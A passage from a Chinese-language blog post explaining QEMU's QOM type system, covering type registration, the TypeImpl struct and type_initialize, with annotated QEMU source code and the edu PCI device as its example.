g_strdup(info-&gt;interfaces[i].type);</span><br><span class="line">    &#125;</span><br><span class="line">    ti-&gt;num_interfaces = i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> GHashTable *<span class="title function_">type_table_get</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> GHashTable *type_table;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (type_table == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        type_table = g_hash_table_new(g_str_hash, g_str_equal);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> type_table;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">type_table_add</span><span class="params">(TypeImpl *ti)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(!enumerating_types);</span><br><span class="line">    g_hash_table_insert(type_table_get(), (<span class="type">void</span> *)ti-&gt;name, ti);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> TypeImpl *<span class="title function_">type_register_internal</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span></span><br><span class="line">&#123;</span><br><span class="line">    TypeImpl *ti;</span><br><span class="line">    ti = type_new(info);</span><br><span class="line"></span><br><span class="line">    type_table_add(ti);</span><br><span class="line">    <span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>TypeImpl</code> 中存放了类型的所有信息，其定义如下。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* TypeImpl：运行期的“类型”元数据。</span></span><br><span class="line"><span class="comment"> * 说明：用于对象系统（如 QOM）中描述一个类型的类大小、实例大小、构造/析构回调、</span></span><br><span class="line"><span class="comment"> *      继承关系以及实现的接口等信息。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeImpl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;                            <span class="comment">// 类型名称（全局唯一，用于注册/查找）</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> class_size;                           <span class="comment">// 类对象（ObjectClass 派生体）所占字节数</span></span><br><span class="line">    <span class="type">size_t</span> instance_size;                        <span class="comment">// 实例对象（Object 派生体）所占字节数</span></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);      <span class="comment">// 类初始化回调：构建类对象时调用，设置虚函数表/类级属性；data 为 class_data</span></span><br><span class="line">    <span class="type">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data); <span class="comment">// 类“基”初始化回调：在搭建类层级的早期执行，用于与父类相关的基础初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *class_data;                            <span class="comment">// 传入 class_init / class_base_init 的私有数据</span></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*instance_init)(Object *obj);          <span class="comment">// 实例构造回调：对象分配后进行字段初始化</span></span><br><span class="line">    <span class="type">void</span> (*instance_post_init)(Object *obj);     <span class="comment">// 实例后置构造：依赖其他属性/对象已就绪后的初始化</span></span><br><span class="line">    <span class="type">void</span> (*instance_finalize)(Object *obj);      <span class="comment">// 实例析构回调：释放实例持有的资源</span></span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> abstract;                               <span class="comment">// 是否为抽象类型（true 表示不能直接实例化）</span></span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;                          <span class="comment">// 父类型名称（继承来源）</span></span><br><span class="line">    TypeImpl *parent_type;                       <span class="comment">// 解析后的父类型指针（注册后填充）</span></span><br><span class="line"></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span>                          <span class="comment">// 该类型对应的类对象（单例）</span></span><br><span class="line">                                                 <span class="comment">// 注：字段名为 class，C 语言合法；在 C++ 中需避免与关键字冲突</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> num_interfaces;                          <span class="comment">// 实现的接口数量</span></span><br><span class="line">    InterfaceImpl interfaces[MAX_INTERFACES];    <span class="comment">// 已实现的接口列表</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h3 id="类型的初始化"><a href="#类型的初始化" class="headerlink" title="类型的初始化"></a>类型的初始化</h3><p>类的初始化是通过 <code>type_initialize</code> 函数完成的，这个函数并不长，函数的输入是表示类型信息的 <code>TypeImpl</code> 类型 <code>ti</code>。函数首先判断了 <code>ti-&gt;class</code> 是否存在，如果不为空就表示这个类型已经初始化过了，直接返回。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ti-&gt;class) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>后面主要做了三件事：</p>
<ul>
<li><p>第一件事是设置相关的 filed，比如 <code>class_size</code> 和 <code>instance_size</code>，使用 <code>ti-&gt;class_size</code> 分配一个 <code>ObjectClass</code>。</p>
<ul>
<li><p>计算 <code>class_size</code> &#x2F; <code>instance_size</code>；</p>
</li>
<li><p>若 <code>instance_size == 0</code>，该类型被视作 <strong>abstract</strong>（接口类型必然如此）；</p>
</li>
<li><p>分配 <code>klass</code>（<code>ObjectClass</code>）内存。</p>
</li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ti-&gt;class_size = type_class_get_size(ti);</span><br><span class="line">ti-&gt;instance_size = type_object_get_size(ti);</span><br><span class="line"><span class="comment">/* Any type with zero instance_size is implicitly abstract.</span></span><br><span class="line"><span class="comment"> * This means interface types are all abstract.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ti-&gt;instance_size == <span class="number">0</span>) &#123;</span><br><span class="line">    ti-&gt;abstract = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (type_is_ancestor(ti, type_interface)) &#123;</span><br><span class="line">    assert(ti-&gt;instance_size == <span class="number">0</span>);</span><br><span class="line">    assert(ti-&gt;abstract);</span><br><span class="line">    assert(!ti-&gt;instance_init);</span><br><span class="line">    assert(!ti-&gt;instance_post_init);</span><br><span class="line">    assert(!ti-&gt;instance_finalize);</span><br><span class="line">    assert(!ti-&gt;num_interfaces);</span><br><span class="line">&#125;</span><br><span class="line">ti-&gt;<span class="class"><span class="keyword">class</span> =</span> g_malloc0(ti-&gt;class_size);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>第二件事就是初始化所有父类类型，不仅包括实际的类型，也包括接口这种抽象类型。</p>
<ul>
<li><p>先递归初始化父类；</p>
</li>
<li><p><code>memcpy()</code> 拷贝父类的类对象内容到子类的 <code>klass</code>，然后把 <code>klass-&gt;interfaces</code> 置空；</p>
</li>
<li><p>逐个把父类携带的接口挂到当前类上；</p>
</li>
<li><p>再把本类在 <code>TypeInfo.interfaces</code> 声明的接口补上（去重，避免父类已提供的重复接口）；</p>
</li>
<li><p>建立类级别的 <code>properties</code> 哈希表。</p>
</li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设：当前位于 type_initialize(TypeImpl *ti) 内部</span></span><br><span class="line">parent = type_get_parent(ti);               <span class="comment">// 解析并缓存父类型（若存在）</span></span><br><span class="line"><span class="keyword">if</span> (parent) &#123;                               <span class="comment">// 若有父类：基于父类来构造本类的 class</span></span><br><span class="line">    type_initialize(parent);                <span class="comment">// 递归确保父类已初始化（parent-&gt;class 就绪）</span></span><br><span class="line">    GSList *e;                              <span class="comment">// 用于遍历接口链表（GLib 单链表）</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    g_assert(parent-&gt;class_size &lt;= ti-&gt;class_size);      <span class="comment">// 子类 class 至少要容纳父类部分</span></span><br><span class="line">    g_assert(parent-&gt;instance_size &lt;= ti-&gt;instance_size);<span class="comment">// 子类实例大小也必须不小于父类</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ti-&gt;class, parent-&gt;class, parent-&gt;class_size);<span class="comment">// 先把父类的类对象前缀拷贝过来</span></span><br><span class="line">    ti-&gt;<span class="class"><span class="keyword">class</span>-&gt;</span>interfaces = <span class="literal">NULL</span>;                        <span class="comment">// 清空接口链表，稍后按规则重建</span></span><br><span class="line">    ti-&gt;<span class="class"><span class="keyword">class</span>-&gt;</span>properties = g_hash_table_new_full(       <span class="comment">// 为“本类”新建属性表</span></span><br><span class="line">        g_str_hash, g_str_equal, <span class="literal">NULL</span>, object_property_free);</span><br><span class="line">                                                      <span class="comment">// key: 属性名；value: ObjectProperty*；</span></span><br><span class="line">                                                      <span class="comment">// 释放函数为 object_property_free</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 继承父类接口：把父类已经附加的每个接口也附加到当前类 ——</span></span><br><span class="line">    <span class="keyword">for</span> (e = parent-&gt;class-&gt;interfaces; e; e = e-&gt;next) &#123;</span><br><span class="line">        InterfaceClass *iface = e-&gt;data;                <span class="comment">// 父类的一个接口类</span></span><br><span class="line">        ObjectClass *klass = OBJECT_CLASS(iface);       <span class="comment">// 作为 ObjectClass 取到其 type</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 为“当前类 + 该接口类型”生成接口类并附加到 ti-&gt;class-&gt;interfaces。</span></span><br><span class="line">        <span class="comment">// 第二个参数：接口的 Type（iface-&gt;interface_type）</span></span><br><span class="line">        <span class="comment">// 第三个参数：父类接口类的 type（klass-&gt;type），沿用父类的更具体实现。</span></span><br><span class="line">        type_initialize_interface(ti, iface-&gt;interface_type, klass-&gt;type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 处理本类显式声明的接口（TypeImpl.interfaces[]） ——</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ti-&gt;num_interfaces; i++) &#123;</span><br><span class="line">        TypeImpl *t = type_get_by_name(ti-&gt;interfaces[i].typename); <span class="comment">// 接口类型的 TypeImpl</span></span><br><span class="line">        <span class="keyword">if</span> (!t) &#123;</span><br><span class="line">            error_report(<span class="string">&quot;missing interface &#x27;%s&#x27; for object &#x27;%s&#x27;&quot;</span>,</span><br><span class="line">                         ti-&gt;interfaces[i].typename, parent-&gt;name);</span><br><span class="line">            <span class="built_in">abort</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 去重/去冗余：如果已经因为父类而附加了“同一或更具体”的接口，就不再附加</span></span><br><span class="line">        <span class="keyword">for</span> (e = ti-&gt;class-&gt;interfaces; e; e = e-&gt;next) &#123;</span><br><span class="line">            TypeImpl *target_type = OBJECT_CLASS(e-&gt;data)-&gt;type;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (type_is_ancestor(target_type, t)) &#123;     <span class="comment">// target_type == t 或 派生自 t</span></span><br><span class="line">                <span class="keyword">break</span>;                                  <span class="comment">// 已满足（甚至更具体），跳过当前 t</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (e) &#123;                                        <span class="comment">// 找到冗余条目：继续下一个接口</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 否则为该接口生成并附加接口类。</span></span><br><span class="line">        <span class="comment">// 这里把“接口类型”和“目标类型”都设为 t（与继承路径不同）。</span></span><br><span class="line">        type_initialize_interface(ti, t, t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;                                               <span class="comment">// 无父类（根类型，如 TYPE_OBJECT）</span></span><br><span class="line">    ti-&gt;class-&gt;properties = g_hash_table_new_full(</span><br><span class="line">        g_str_hash, g_str_equal, <span class="literal">NULL</span>, object_property_free);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反向关联：让类对象能回到它的 TypeImpl（抽象与否都要设置）</span></span><br><span class="line">ti-&gt;<span class="class"><span class="keyword">class</span>-&gt;</span>type = ti;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>第三件事就是依次调用所有父类的 <code>class_base_init</code> 以及自己的 <code>class_init</code>，这也和 C++ 很类似，在初始化一个对象的时候会依次调用所有父类的构造函数。这里是调用了父类型的 <code>class_base_init</code> 函数。</p>
<ul>
<li>按祖先链自下而上依次调用各祖先的 <code>class_base_init</code>；</li>
<li><strong>只调用本类的</strong> <code>class_init</code>（祖先的 <code>class_init</code> 在祖先初始化时已经调用过了）。</li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (parent) &#123;</span><br><span class="line">    <span class="keyword">if</span> (parent-&gt;class_base_init) &#123;</span><br><span class="line">        parent-&gt;class_base_init(ti-&gt;class, ti-&gt;class_data);</span><br><span class="line">    &#125;</span><br><span class="line">    parent = type_get_parent(parent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ti-&gt;class_init) &#123;</span><br><span class="line">    ti-&gt;class_init(ti-&gt;class, ti-&gt;class_data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>实际上 <code>type_initialize</code> 函数可以在很多地方调用，不过，只有在第一次调用的时候会进行初始化，之后的调用会由于 <code>ti-&gt;class</code> 不为空而直接返回。</p>
<p>下面以其中一条路径来看 <code>type_initialize</code> 函数的调用过程。假设在启动 QEMU 虚拟机的时候不指定 <code>machine</code> 参数，那 QEMU 会在 main 函数中调用 <code>select_machine</code>，进而由 <code>find_default_machine</code> 函数来找默认的 <code>machine</code> 类型。在那个函数之前，会调用 <code>object_class_get_list</code> 来得到所有 <code>TYPE_MACHINE</code> 类型组成的链表。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">	&gt; machine_class = select_machine();</span><br><span class="line">		&gt; GSList *machines = object_class_get_list(TYPE_MACHINE, <span class="literal">false</span>);</span><br><span class="line">		&gt; MachineClass *machine_class = find_default_machine(machines);</span><br></pre></td></tr></table></figure></div>

<p><code>object_class_get_list</code> 会调用 <code>object_class_foreach</code>，后者会对 <code>type_table</code> 中所有类型调用 <code>object_class_foreach_tramp</code> 函数，在该函数中会调用 <code>type_initialize</code> 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 便捷函数：收集满足条件的类，返回一个 GSList* 链表。</span></span><br><span class="line"><span class="comment">// implements_type  : 同上；若为接口名，则返回实现该接口的类；若为基类名，则返回其所有后代类</span></span><br><span class="line"><span class="comment">// include_abstract : 是否把抽象类也放进结果</span></span><br><span class="line">GSList *<span class="title function_">object_class_get_list</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *implements_type,</span></span><br><span class="line"><span class="params">                              <span class="type">bool</span> include_abstract)</span></span><br><span class="line">&#123;</span><br><span class="line">    GSList *<span class="built_in">list</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// object_class_get_list_tramp 是一个小收集器回调：</span></span><br><span class="line">    <span class="comment">// 把每个匹配到的 ObjectClass 追加/前插到 list 中（opaque 即 &amp;list）</span></span><br><span class="line">    object_class_foreach(object_class_get_list_tramp,</span><br><span class="line">                         implements_type, include_abstract, &amp;<span class="built_in">list</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>;  <span class="comment">// 注意：调用者通常需要 g_slist_free(list) 释放“链表节点”本身</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 公共遍历入口：对类型表中所有（或满足条件的）类逐个调用回调。</span></span><br><span class="line"><span class="comment">// fn               : 对每个匹配到的 ObjectClass 执行的回调</span></span><br><span class="line"><span class="comment">// implements_type  : 过滤条件；仅选择“是该类型或其子类/实现该接口”的类；NULL 表示不过滤</span></span><br><span class="line"><span class="comment">// include_abstract : 是否包含抽象类</span></span><br><span class="line"><span class="comment">// opaque           : 传递给回调的用户数据</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">object_class_foreach</span><span class="params">(<span class="type">void</span> (*fn)(ObjectClass *klass, <span class="type">void</span> *opaque),</span></span><br><span class="line"><span class="params">                          <span class="type">const</span> <span class="type">char</span> *implements_type, <span class="type">bool</span> include_abstract,</span></span><br><span class="line"><span class="params">                          <span class="type">void</span> *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">    OCFData data = &#123; fn, implements_type, include_abstract, opaque &#125;;</span><br><span class="line"></span><br><span class="line">    enumerating_types = <span class="literal">true</span>;   <span class="comment">// 标记“正在枚举类型”，防止枚举期间向 type_table 插入新类型</span></span><br><span class="line">    g_hash_table_foreach(type_table_get(),   <span class="comment">// 取到全局类型表</span></span><br><span class="line">                         object_class_foreach_tramp, <span class="comment">// 对每个条目调用上面的跳板函数</span></span><br><span class="line">                         &amp;data);</span><br><span class="line">    enumerating_types = <span class="literal">false</span>;  <span class="comment">// 枚举结束，清除标记</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历类型表(type_table)时用的“跳板”函数（trampoline）。</span></span><br><span class="line"><span class="comment">// key    : 哈希表键（类型名，未使用）</span></span><br><span class="line"><span class="comment">// value  : 哈希表值（TypeImpl*，运行期的类型描述符）</span></span><br><span class="line"><span class="comment">// opaque : 上下文指针，这里实际是 OCFData*，携带过滤条件与用户回调</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">object_class_foreach_tramp</span><span class="params">(gpointer key, gpointer value,</span></span><br><span class="line"><span class="params">                                       gpointer opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">    OCFData *data = opaque;     <span class="comment">// 用户数据：&#123;回调fn、implements_type、include_abstract、opaque&#125;</span></span><br><span class="line">    TypeImpl *type = value;     <span class="comment">// 当前遍历到的类型</span></span><br><span class="line">    ObjectClass *k;</span><br><span class="line"></span><br><span class="line">    type_initialize(type);      <span class="comment">// “惰性类初始化”：若该类型尚未构造其 ObjectClass，则现在构造</span></span><br><span class="line">    k = type-&gt;class;            <span class="comment">// 取到该类型对应的类对象（ObjectClass）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 过滤 1：若不允许包含抽象类，且该类型是抽象类，则跳过</span></span><br><span class="line">    <span class="keyword">if</span> (!data-&gt;include_abstract &amp;&amp; type-&gt;abstract) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 过滤 2：若要求实现某个类型/接口，但当前类动态转型失败，则跳过</span></span><br><span class="line">    <span class="comment">// object_class_dynamic_cast(k, X) 成功表示：</span></span><br><span class="line">    <span class="comment">//   - k 是 X 的子类，或</span></span><br><span class="line">    <span class="comment">//   - k 实现了接口 X（若 X 是接口类型）</span></span><br><span class="line">    <span class="keyword">if</span> (data-&gt;implements_type &amp;&amp; </span><br><span class="line">        !object_class_dynamic_cast(k, data-&gt;implements_type)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过全部过滤条件后，调用用户提供的回调对该类做处理</span></span><br><span class="line">    data-&gt;fn(k, data-&gt;opaque);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="类型的层次结构"><a href="#类型的层次结构" class="headerlink" title="类型的层次结构"></a>类型的层次结构</h3><p>在 <code>edu</code> 这个设备的类型信息里（<code>edu_info</code>），有个 <code>parent</code> 字段，写着它的父类型是谁。</p>
<p>对 <code>edu</code> 来说，父类型是 <code>TYPE_PCI_DEVICE</code>。而 <code>TYPE_PCI_DEVICE</code> 的父类型是 <code>TYPE_DEVICE</code>，再往上是 <code>TYPE_OBJECT</code>。换句话说，类型继承链是：<code>TYPE_OBJECT → TYPE_DEVICE → TYPE_PCI_DEVICE → edu</code>。</p>
<p>QEMU 的所有类型都挂在这棵以 <code>TYPE_OBJECT</code> 为根的树上。</p>
<p>初始化类型时（<code>type_initialize</code>），QEMU 会给“类对象”（class）分配内存，这个“类对象”并不是 C++ 的 class，但作用很像：它保存了某个类型的“方法表&#x2F;元数据”（回调函数、标识字段等）。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ti-&gt;<span class="class"><span class="keyword">class</span> =</span> g_malloc0(ti-&gt;class_size);</span><br></pre></td></tr></table></figure></div>

<p><code>class_size</code> 决定了这个“类对象”到底长啥样（也就是用哪种结构体）。如果当前类型没自己指定 <code>class_size</code>，就沿用父类型的 <code>class_size</code>。</p>
<p>在 edu 设备的类型信息 <code>edu_info</code> 结构中有一个 <code>parent</code> 成员，这就指定了 <code>edu_info</code> 的父类型的名称，通过分析源码可知继承关系为 <code>TYPE_PCI_DEVICE-&gt;TYPE_DEVICE-&gt;TYPE_OBJECT</code>。总体上，QEMU 使用的类型一起构成了以 <code>TYPE_OBJECT</code> 为根的树。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> const <span class="type">TypeInfo</span> <span class="variable">edu_info</span> <span class="operator">=</span> &#123;</span><br><span class="line">    .name          = TYPE_PCI_EDU_DEVICE,</span><br><span class="line">    .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">    .instance_size = sizeof(EduState),</span><br><span class="line">    .instance_init = edu_instance_init,</span><br><span class="line">    .class_init    = edu_class_init,</span><br><span class="line">    .interfaces = interfaces,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>edu</code> 类型没有定义自己的 <code>class_size</code>，所以直接继承父类型 <code>TYPE_PCI_DEVICE</code> 的 <code>class_size</code>。父类型的类结构体就是 <code>PCIDeviceClass</code>，因此 <code>edu</code> 的类对象类型也就是 <code>PCIDeviceClass</code>（里面包含 <code>realize/exit/config_read/config_write</code> 等回调，以及 vendor&#x2F;device&#x2F;class 等标识字段）。</p>
<p>在类型的初始化函数 <code>type_initialize</code> 中会调用 <code>ti-&gt;class=g_malloc0(ti-&gt;class_size)</code> 语句来分配类型的 class 结构，这个结构实际上代表了类型的信息。类似于 C++ 定义的一个类，从前面的分析看到 <code>ti-&gt;class_size</code> 为 <code>TypeImpl</code> 中的值，如果类型本身没有定义就会使用父类型的 <code>class_size</code> 进行初始化。edu 设备中的类型本身没有定义，所以它的 <code>class_size</code> 为 <code>TYPE_PCI_DEVICE</code> 中定义的值，即 <code>sizeof(PCIDeviceClass)</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// QEMU 中用于描述“PCI 设备类”的类型。</span></span><br><span class="line"><span class="comment">// 它相当于某类 PCI 设备的“类信息/元数据”，包含生命周期回调和</span></span><br><span class="line"><span class="comment">// 在配置空间(Configuration Space)中要呈现的标识字段等。</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCIDeviceClass</span> &#123;</span></span><br><span class="line">    DeviceClass parent_class;  <span class="comment">// 继承自通用的 DeviceClass（QOM 体系中的父类）</span></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*realize)(PCIDevice *dev, Error **errp); <span class="comment">// 设备实例化/上线回调：分配资源、注册 BAR/中断等</span></span><br><span class="line">    PCIUnregisterFunc *<span class="built_in">exit</span>;                       <span class="comment">// 设备下线/清理回调：释放 realize 中分配的资源</span></span><br><span class="line">    PCIConfigReadFunc *config_read;                <span class="comment">// 处理对 PCI 配置空间的读取（可覆盖默认行为）</span></span><br><span class="line">    PCIConfigWriteFunc *config_write;              <span class="comment">// 处理对 PCI 配置空间的写入（可覆盖默认行为）</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint16_t</span> vendor_id;            <span class="comment">// PCI Vendor ID（厂商 